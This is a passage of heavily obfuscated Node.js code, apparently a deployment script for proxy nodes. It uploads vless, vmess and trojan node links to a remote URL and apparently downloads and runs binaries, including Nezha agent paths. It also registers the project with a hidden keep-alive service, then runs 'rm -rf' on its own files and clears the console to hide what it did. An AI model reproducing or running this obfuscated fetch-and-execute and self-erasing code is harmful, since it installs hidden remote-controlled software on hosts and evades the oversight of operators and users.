_0x445ebe=_0x16b844,_0x4286df=Buffer[_0x445ebe(_0x3ec5e0._0x1cea04)](_0x2bd651)[_0x445ebe(_0x3ec5e0._0x38246d)](_0x445ebe(_0x3ec5e0._0x3b4bfc));_0x51c6f8[_0x445ebe(0x1d7)](_0x445ebe(_0x3ec5e0._0x223fd2),'text/plain;\x20charset=utf-8'),_0x51c6f8['send'](_0x4286df);}),_0x544fbe(_0x2bd651);},0x7d0);});}}async function uploadNodes(){const _0x8480e5={_0x1c85f0:0x241,_0xb1195e:0x23d,_0x155971:0x1e9,_0x3a2e54:0x202,_0x19c238:0x1af,_0x27f4e5:0x25e,_0x1defa5:0x221,_0x1d4e8f:0x25a,_0x223fae:0x1c0},_0x345ffa=_0x21e019;if(UPLOAD_URL&&PROJECT_URL){const _0x312465=PROJECT_URL+'/'+SUB_PATH,_0x440533={'subscription':[_0x312465]};try{const _0x1f47fc=await axios['post'](UPLOAD_URL+_0x345ffa(0x1fd),_0x440533,{'headers':{'Content-Type':_0x345ffa(_0x8480e5._0x1c85f0)}});return _0x1f47fc&&_0x1f47fc[_0x345ffa(0x23d)]===0xc8?(console['log'](_0x345ffa(0x1bc)),_0x1f47fc):null;}catch(_0x3f18f4){if(_0x3f18f4[_0x345ffa(0x1bb)]){if(_0x3f18f4['response'][_0x345ffa(_0x8480e5._0xb1195e)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x345ffa(0x21f)](listPath))return;const _0x217dbb=fs[_0x345ffa(_0x8480e5._0x155971)](listPath,_0x345ffa(0x1ef)),_0x4fc256=_0x217dbb[_0x345ffa(_0x8480e5._0x3a2e54)]('\x0a')[_0x345ffa(_0x8480e5._0x19c238)](_0x4d13e5=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x345ffa(0x1de)](_0x4d13e5));if(_0x4fc256[_0x345ffa(_0x8480e5._0x27f4e5)]===0x0)return;const _0x18f1b5=JSON[_0x345ffa(0x262)]({'nodes':_0x4fc256});try{const _0xd083b1=await axios[_0x345ffa(_0x8480e5._0x1defa5)](UPLOAD_URL+'/api/add-nodes',_0x18f1b5,{'headers':{'Content-Type':_0x345ffa(_0x8480e5._0x1c85f0)}});return _0xd083b1&&_0xd083b1['status']===0xc8?(console[_0x345ffa(_0x8480e5._0x1d4e8f)](_0x345ffa(_0x8480e5._0x223fae)),_0xd083b1):null;}catch(_0x1ef8ab){return null;}}else return;}}function cleanFiles(){const _0x12eb1c={_0x31a7bb:0x1c2,_0x17a795:0x24d,_0x24ffff:0x24d};setTimeout(()=>{const _0xa434e1={_0x31c5c9:0x25a},_0x5e277f=_0xd25b,_0x451d29=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x451d29[_0x5e277f(0x23e)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x451d29[_0x5e277f(0x23e)](phpPath);process[_0x5e277f(0x1ce)]===_0x5e277f(_0x12eb1c._0x31a7bb)?exec(_0x5e277f(0x213)+_0x451d29[_0x5e277f(_0x12eb1c._0x17a795)]('\x20')+_0x5e277f(0x222),_0x2366b9=>{const _0x483270=_0x5e277f;console['clear'](),console[_0x483270(0x25a)](_0x483270(0x1b8)),console[_0x483270(_0xa434e1._0x31c5c9)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec('rm\x20-rf\x20'+_0x451d29[_0x5e277f(_0x12eb1c._0x24ffff)]('\x20')+_0x5e277f(0x24f),_0x5bf5f9=>{const _0x564b4d=_0x5e277f;console['clear'](),console['log'](_0x564b4d(0x1b8)),console['log'](_0x564b4d(0x24b));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x5577a3=_0x21e019;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x5577a3(0x25a)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x12006f=await axios['post'](_0x5577a3(0x1c9),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x5577a3(0x241)}});return console[_0x5577a3(0x25a)]('automatic\x20access\x20task\x20added\x20successfully'),_0x12006f;}catch(_0x558b4d){return console[_0x5577a3(0x1c7)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x558b4d['message']),null;}}async function startserver(){const _0xd01fc8=_0x21e019;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x25b5ae){console[_0xd01fc8(0x1c7)]('Error\x20in\x20startserver:',_0x25b5ae);}}startserver()[_0x21e019(0x214)](_0x2c775e=>{const _0xdeb99a={_0x3ade2f:0x1c7,_0x123150:0x1b6},_0x6326d4=_0x21e019;console[_0x6326d4(_0xdeb99a._0x3ade2f)](_0x6326d4(_0xdeb99a._0x123150),_0x2c775e);}),app['listen'](PORT,()=>console[_0x21e019(0x25a)](_0x21e019(0x232)+PORT+'!'));
